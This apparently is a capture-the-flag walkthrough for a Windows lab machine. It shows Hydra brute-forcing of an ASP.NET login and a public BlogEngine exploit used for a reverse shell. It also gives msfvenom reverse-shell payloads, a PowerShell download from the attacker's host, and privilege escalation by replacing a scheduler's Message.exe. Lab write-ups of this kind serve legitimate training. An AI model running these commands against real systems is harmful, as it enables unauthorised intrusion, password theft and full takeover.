Nmap shows that 80, 3389 are open

Browse to the web server 

You will notice there is a login page

Use burp to intercept the POST request when attempting to login
You will see the following info at the bottom of the intercept form

__VIEWSTATE=VZ9VKcf3IHBz3fG0KqcDliS%2BUgjKa%2FCjc%2FAw9ORrVtEOtxbpNwYJAOtuzIzEotzcRid9bAjenULWzQBfQqllISGAZFvKG%2B795eGx3ThMLgOqozr3nRDjZ10Eaisk7a7M0xSnTindUCVYD%2BJmvt7qt13Ov0wHqFo5WUy5ODRtmiDfUZaPPr1lGlxffmdaJW1bPMwXeK2Ku8Rf2uHK%2BTgQ1qLpiEV6wuoEqMh7aEUhqwEmXvwHV9teQwgrw3Z2Nrgv8x9oWKt%2F0FWgs4fw0G7v1lWBlsosZGDSwAd8T8hzfsRWF6ZGBJHUlx03Y3qDc6dVZ17JbwVlE1h3vS11M2%2FHL5XsNl%2BAQKMMdXP1pWNacWhxJtI8&

__EVENTVALIDATION=9TlDzndOHO0c8cDMjvdp9J48k8Tpeo%2FgH6%2FD%2F3MJ9binUoDrjz80IyUQqAlXY5jH6BRdAMCXxVQbPRLiAkp6%2BQL6xbGt6QLlAfIsrq9Nc4IMkdISAqQQc4KW0HXen3t3MD6j92yGggJl%2FG%2FVL%2BsxNe0hb7%2FVjroKu8CqWq5RvpceH8eA&ctl00%24MainContent%24LoginUser%24UserName=sfffsaf&ctl00%24MainContent%24LoginUser%24Password=sfsaf&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

So, lets make up a command with Hydra to bruteforce the login page and find admin's password:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.17.251 http-post-form "/Account/login.aspx:__VIEWSTATE=VZ9VKcf3IHBz3fG0KqcDliS%2BUgjKa%2FCjc%2FAw9ORrVtEOtxbpNwYJAOtuzIzEotzcRid9bAjenULWzQBfQqllISGAZFvKG%2B795eGx3ThMLgOqozr3nRDjZ10Eaisk7a7M0xSnTindUCVYD%2BJmvt7qt13Ov0wHqFo5WUy5ODRtmiDfUZaPPr1lGlxffmdaJW1bPMwXeK2Ku8Rf2uHK%2BTgQ1qLpiEV6wuoEqMh7aEUhqwEmXvwHV9teQwgrw3Z2Nrgv8x9oWKt%2F0FWgs4fw0G7v1lWBlsosZGDSwAd8T8hzfsRWF6ZGBJHUlx03Y3qDc6dVZ17JbwVlE1h3vS11M2%2FHL5XsNl%2BAQKMMdXP1pWNacWhxJtI8&__EVENTVALIDATION=9TlDzndOHO0c8cDMjvdp9J48k8Tpeo%2FgH6%2FD%2F3MJ9binUoDrjz80IyUQqAlXY5jH6BRdAMCXxVQbPRLiAkp6%2BQL6xbGt6QLlAfIsrq9Nc4IMkdISAqQQc4KW0HXen3t3MD6j92yGggJl%2FG%2FVL%2BsxNe0hb7%2FVjroKu8CqWq5RvpceH8eA&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:login failed" 

This will get you the password, so login with the credentials 

From here, do some digging and you will find the version of BlogEngine the server is running

Search exploit-db and find https://www.exploit-db.com/exploits/46353

I read through the file/script and set the proper parameters, uploaded the file to the proper location and was able
to catch a reverse shell 

Our shell is unstable, so lets use metasploit/msfvenom to get something more stable doing the following steps:
	1. Create the revshell paylod with: msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe -e x86/shikata_ga_nai -i 4 > shell-cmd.exe
	2. Spin up a simple http server in the directory of your newly made .exe
	3. In our netcat listening session on the Win machine, grab the file with: Invoke-WebRequest -Uri <source> -OutFile <destination>
	4. Fire up msfconsole. use exploit/multi/handler. set payload as windows/meterpreter/reverse_tcp

	powershell -c wget "http://10.6.24.197:8000/Message.exe -outfile "Message.exe"

Run: winpeas.exe servicesinfo


You will find that the System Scheduler Service is vulernable to privesc
You can read more at https://www.exploit-db.com/exploits/45072

After looking at the logs file in program files(x86)/systemscheduler/events, it seems like you can overwrite the Message.exe file
with a malicious copy

Run the same msfvenom command as earlier but change the listening port to something else.

Upload this file to overwrite the original Message.exe

Within a few minutes, the reverse shell should catch on your metasploit session and will spawn
a root meterpreter shell!

